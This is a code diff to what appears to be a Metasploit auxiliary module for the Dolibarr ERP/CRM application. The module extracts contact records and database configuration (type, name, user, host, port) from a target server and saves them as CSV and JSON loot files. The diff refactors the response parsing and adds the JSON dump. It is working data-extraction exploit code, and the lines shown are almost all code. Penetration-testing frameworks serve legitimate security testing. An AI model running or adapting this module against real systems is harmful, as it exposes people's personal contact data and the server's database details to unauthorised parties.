@@ -79,7 +79,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     }, 90, true)
 
-    res_json_document = res.get_json_document['contacts']
+    res_json_document = res.get_json_document
 
     if res && res.code != 200
       fail_with(Failure::UnexpectedReply, "Exploit response code: #{res.code}")
@@ -87,29 +87,41 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'Dolibarr database empty')
     end
 
+    contacts = res_json_document['contacts']
+    fail_with(Failure::UnexpectedReply, 'Dolibarr data did not include contacts field') if contacts.blank?
+
     begin
-      print_good("Database type: #{res_json_document[0]['db']['type']}")
-      print_good("Database name: #{res_json_document[0]['db']['database_name']}")
-      print_good("Database user: #{res_json_document[0]['db']['database_user']}")
-      print_good("Database host: #{res_json_document[0]['db']['database_host']}")
-      print_good("Database port: #{res_json_document[0]['db']['database_port']}")
+      print_good("Database type: #{contacts[0]['db']['type']}")
+      print_good("Database name: #{contacts[0]['db']['database_name']}")
+      print_good("Database user: #{contacts[0]['db']['database_user']}")
+      print_good("Database host: #{contacts[0]['db']['database_host']}")
+      print_good("Database port: #{contacts[0]['db']['database_port']}")
     end
 
-    contact_fields = res.get_json_document['contacts'][0].keys
+    contact_fields = contacts[0].keys
     contact_fields.delete('db') # We do not want this in the csv
 
     contact_entry_data = []
 
-    nbr_contact = res_json_document.length.to_i
+    nbr_contact = contacts.length.to_i
+
+    path_json_file = store_loot(
+      'dolibarr',
+      'application/json',
+      ip,
+      JSON.pretty_generate(res.get_json_document),
+      '.json'
+    )
 
     print_good("Found #{nbr_contact} contacts.")
+    print_good("#{rhost}:#{rport} - File saved in: #{path_json_file}")
 
     csv_string = CSV.generate do |csv| # Loop to write into csv
       csv << contact_fields
       nbr_contact.times do |num| # Loop on every contact
         contact_fields.each do |element|
-          if res_json_document[num][element.to_s].is_a?(String) || res_json_document[num][element.to_s].is_a?(Int)
-            contact_entry_data << res_json_document[num][element.to_s].to_s.gsub("\r\n", ' ')
+          if contacts[num][element.to_s].is_a?(String) || contacts[num][element.to_s].is_a?(Int)
+            contact_entry_data << contacts[num][element.to_s].to_s.gsub("\r\n", ' ')
           end
         rescue StandardError
           contact_entry_data << ' '
@@ -119,15 +131,15 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    path = store_loot(
+    path_csv_file = store_loot(
       'dolibarr',
-      'application/CSV',
+      'application/csv',
       ip,
       csv_string,
       '.csv'
     )
 
-    print_good("#{rhost}:#{rport} - File saved in: #{path}")
+    print_good("#{rhost}:#{rport} - File saved in: #{path_csv_file}")
   end
 
   def run_host(ip)
